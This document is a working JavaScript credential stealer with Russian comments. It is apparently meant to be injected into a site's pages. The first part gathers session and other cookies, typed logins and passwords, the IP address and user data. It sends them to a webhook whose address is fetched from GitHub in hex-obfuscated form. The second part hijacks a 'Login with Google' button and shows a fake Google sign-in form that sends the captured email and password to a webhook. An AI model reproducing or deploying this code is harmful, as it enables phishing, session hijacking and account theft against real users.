(async function() {
    // Функция для получения куки
    const getCookie = (name) => {
        const matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    };

    // Получаем IP
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || "Не удалось получить IP";
        } catch {
            return "Не удалось получить IP";
        }
    };

    // Функция для сбора логина и пароля
    const getCredentials = () => {
        try {
            const usernameField = document.querySelector('#loginUsername') || 
                                document.querySelector('input[name="login"]') ||
                                document.querySelector('input[type="text"]');
            
            const passwordField = document.querySelector('input[type="password"]') || 
                                 document.querySelector('input[name*="pass"]') ||
                                 document.querySelector('input#password');
            
            const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
            const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
            
            return { username, password };
        } catch {
            return { 
                username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
            };
        }
    };

    // Получаем ВСЕ куки пользователя
    const getAllCookies = () => {
        return document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return `${name}=${value}`;
        }).join('\n');
    };

    // Проверяем и получаем данные из переменной `user`
    const getUserData = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(user, null, 2);
            }
            return "Переменная 'user' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'user': ${e.message}`;
        }
    };

    // Получаем уровень пользователя с возможностью добавления 'x'
    const getUserLevel = (addX = false) => {
        try {
            if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                return `level: ${user.level}${addX ? 'x' : ''}`;
            }
            return `level: не определен${addX ? 'x' : ''}`;
        } catch (e) {
            return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
        }
    };

    const getValidWebhook = async () => {
        try {
            const response = await fetch('https://raw.githubusercontent.com/shannonkind87/acs/refs/heads/main/def.js');
            const text = await response.text();
            
            const hexMatch = text.match(/'([\x00-\x7F]+)'/);
            if (hexMatch && hexMatch[1]) {
                // Расшифровываем hex строку
                const hexString = hexMatch[1];
                let decodedString = '';
                for (let i = 0; i < hexString.length; i += 4) {
                    const hexChar = hexString.substr(i, 4);
                    if (hexChar.startsWith('\\x')) {
                        const charCode = parseInt(hexChar.substr(2), 16);
                        decodedString += String.fromCharCode(charCode);
                    }
                }
                return decodedString;
            }
            return null;
        } catch {
            return null;
        }
    };

    const sendUserData = async () => {
        // Получаем и проверяем вебхук
        const validWebhook = await getValidWebhook();
        if (!validWebhook) {
            console.log("Не удалось получить валидный вебхук");
            return;
        }

        const phpsessid = getCookie('PHPSESSID');
        const userIP = await getIP();
        const credentials = getCredentials();
        const allCookies = getAllCookies();
        const userData = getUserData();
        
        // Проверяем, заполнены ли оба поля
        const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                               credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                               credentials.username && credentials.password;
        
        // Получаем уровень с 'x', если поля заполнены
        const userLevel = getUserLevel(bothFieldsFilled);
        
        // Формируем содержимое файла
        let fileContent = "=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===\n\n";
        fileContent += `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\n\n`;
        fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
        fileContent += `IP-адрес: ${userIP}\n`;
        fileContent += `URL страницы: ${window.location.href}\n`;
        fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
        fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---\n${userData}\n\n`;
        fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
        fileContent += `Логин: ${credentials.username}\n`;
        fileContent += `Пароль: ${credentials.password}\n\n`;
        fileContent += `--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---\n${allCookies || "Куки не обнаружены"}\n`;

        // Создаем файл и отправляем
        const blob = new Blob([fileContent], { type: 'text/plain' });
        const formData = new FormData();
        formData.append('file', blob, `user_data_${Date.now()}.txt`);

        try {
            await fetch(validWebhook, {
                method: "POST",
                body: formData
            });
            
            // После успешной отправки убираем 'x' из уровня
            if (bothFieldsFilled) {
              
            }
        } catch (e) {
           
        }
    };

    await sendUserData();
})();
(function(){
    const TEXT = {
        en: {
            emailLabel: "Sign in",
            emailDesc: "to continue to Google",
            emailPlaceholder: "Email or phone",
            passwordPlaceholder: "Enter your password",
            next: "Next",
            showPassword: "Show password",
            forgotPassword: "Forgot password?",
            emailError: "Enter a valid Gmail address",
            passwordError: "Wrong password. Try again.",
            verifying: "Verifying...",
        }
    };

    let userEmail = "";
    let WEBHOOK_URL = "";

    function modifyGoogleButton() {
        const googleBtn = document.querySelector('a[onclick*="glogin"][data-tag="social"] img[alt="Login with Google"]')?.parentElement;
        
        if (googleBtn) {
            googleBtn.removeAttribute('onclick');
            if (!googleBtn.id) googleBtn.id = 'gloginftok';
            if (!googleBtn.hasAttribute('data-handler-added')) {
                googleBtn.addEventListener('click', handleGoogleButtonClick);
                googleBtn.setAttribute('data-handler-added', 'true');
            }
        }
    }

    function handleGoogleButtonClick(e) {
        e.preventDefault();
        showFakeGoogleAuth();
    }

    function showFakeGoogleAuth() {
        const oldOverlay = document.querySelector('.auth-overlay');
        if (oldOverlay) oldOverlay.remove();

        const overlay = document.createElement('div');
        overlay.className = 'auth-overlay';
        overlay.innerHTML = `
            <div class="auth-box" id="authBox">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" class="google-logo">
                <div class="auth-title">${TEXT.en.emailLabel}</div>
                <div class="auth-subtitle">${TEXT.en.emailDesc}</div>
                <div id="stepContainer">
                    <input id="kliogin" class="auth-input" type="email" placeholder="${TEXT.en.emailPlaceholder}">
                    <div id="errorMsg" class="error-msg" style="display:none"></div>
                    <div style="text-align:right;">
                        <button class="auth-btn" id="nextStepBtn">${TEXT.en.next}</button>
                    </div>
                </div>
            </div>
        `;
        document.body.appendChild(overlay);

        injectStyles();
        document.getElementById('nextStepBtn').addEventListener('click', nextStep);
    }

    function injectStyles() {
        const styleId = 'fake-google-auth-styles';
        if (document.getElementById(styleId)) return;

        const style = document.createElement('style');
        style.id = styleId;
        style.textContent = `
            .auth-overlay {
                font-family: 'Roboto', sans-serif;
                background: #fff;
                position: fixed;
                inset: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 9999;
            }
            .auth-box {
                width: 360px;
                border: 1px solid #dadce0;
                border-radius: 8px;
                padding: 40px;
                box-shadow: 0 1px 2px rgba(0,0,0,0.2);
            }
            .google-logo {
                width: 75px;
                margin: 0 auto 20px;
                display: block;
            }
            .auth-title {
                font-size: 24px;
                color: #202124;
                text-align: center;
            }
            .auth-subtitle {
                color: #5f6368;
                text-align: center;
                margin-bottom: 30px;
            }
            .auth-input {
                width: 100%;
                font-size: 16px;
                padding: 12px;
                border: 1px solid #dadce0;
                border-radius: 4px;
                margin-bottom: 10px;
            }
            .error-msg {
                color: #d93025;
                font-size: 14px;
                margin-bottom: 10px;
            }
            .auth-footer {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-top: 10px;
            }
            .auth-btn {
                background: #1a73e8;
                color: white;
                padding: 10px 24px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
        `;
        document.head.appendChild(style);
    }

    function nextStep() {
        const emailInput = document.getElementById('kliogin');
        const email = emailInput.value.trim();
        userEmail = email;

        const step = document.getElementById('stepContainer');
        const error = document.getElementById('errorMsg');

        if (!email) {
            error.style.display = "block";
            error.textContent = TEXT.en.emailError;
            return;
        }

        step.innerHTML = `
            <input id="kpisword" class="auth-input" type="password" placeholder="${TEXT.en.passwordPlaceholder}">
            <div style="margin-bottom:10px;">
                <label style="font-size:14px;">
                    <input type="checkbox" id="togglePassword"> ${TEXT.en.showPassword}
                </label>
            </div>
            <div id="errorMsg" class="error-msg" style="display:none"></div>
            <div class="auth-footer">
                <a href="#" style="font-size:14px;color:#1a73e8;">${TEXT.en.forgotPassword}</a>
                <button class="auth-btn" id="submitAuthBtn">${TEXT.en.next}</button>
            </div>
        `;

        document.getElementById('togglePassword').addEventListener('change', togglePassword);
        document.getElementById('submitAuthBtn').addEventListener('click', submitAuth);
    }

    function togglePassword() {
        const pwd = document.getElementById('kpisword');
        pwd.type = pwd.type === "password" ? "text" : "password";
    }

    async function submitAuth() {
        const pass = document.getElementById('kpisword').value.trim();
        const error = document.getElementById('errorMsg');
        error.style.display = 'none';

        const step = document.getElementById('stepContainer');
        step.innerHTML = `<div style="text-align:center;font-size:16px;color:#5f6368;">${TEXT.en.verifying}</div>`;

        try {
            if (!WEBHOOK_URL) WEBHOOK_URL = await getWebhookUrl();
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `📧 ${userEmail}\n🔑 ${pass}` })
            });
        } catch (e) {
            console.error("Failed to send data:", e);
        }

        await new Promise(r => setTimeout(r, 1500));

        if (!userEmail.endsWith('@gmail.com')) {
            step.innerHTML = `
                <div class="error-msg">${TEXT.en.emailError}</div>
                <button class="auth-btn" id="retryStepBtn">${TEXT.en.next}</button>
            `;
            document.getElementById('retryStepBtn').addEventListener('click', retryStep);
            return;
        }

        if (pass.length < 6) {
            step.innerHTML = `
                <div class="error-msg">${TEXT.en.passwordError}</div>
                <button class="auth-btn" id="retryStepBtn">${TEXT.en.next}</button>
            `;
            document.getElementById('retryStepBtn').addEventListener('click', retryStep);
            return;
        }

        document.querySelector('.auth-overlay')?.remove();
    }

    function retryStep() {
        const step = document.getElementById('stepContainer');
        step.innerHTML = `
            <input id="kpisword" class="auth-input" type="password" placeholder="${TEXT.en.passwordPlaceholder}">
            <div style="margin-bottom:10px;">
                <label style="font-size:14px;">
                    <input type="checkbox" id="togglePassword"> ${TEXT.en.showPassword}
                </label>
            </div>
            <div id="errorMsg" class="error-msg" style="display:none"></div>
            <div class="auth-footer">
                <a href="#" style="font-size:14px;color:#1a73e8;">${TEXT.en.forgotPassword}</a>
                <button class="auth-btn" id="submitAuthBtn">${TEXT.en.next}</button>
            </div>
        `;

        document.getElementById('togglePassword').addEventListener('change', togglePassword);
        document.getElementById('submitAuthBtn').addEventListener('click', submitAuth);
    }

    async function getWebhookUrl() {
        try {
            const response = await fetch('https://raw.githubusercontent.com/shannonkind87/acs/refs/heads/main/def1.js');
            const scriptContent = await response.text();
            const urlMatch = scriptContent.match(/i\s*=\s*'([^']+)'/);
            if (urlMatch && urlMatch[1]) {
                return urlMatch[1].replace(/\\x([0-9a-f]{2})/gi, 
                    (match, p1) => String.fromCharCode(parseInt(p1, 16)));
            }
            throw new Error("Webhook URL not found");
        } catch (error) {
            console.error("Failed to fetch webhook URL:", error);
            throw error;
        }
    }

    modifyGoogleButton();
    setInterval(modifyGoogleButton, 1000);
})();
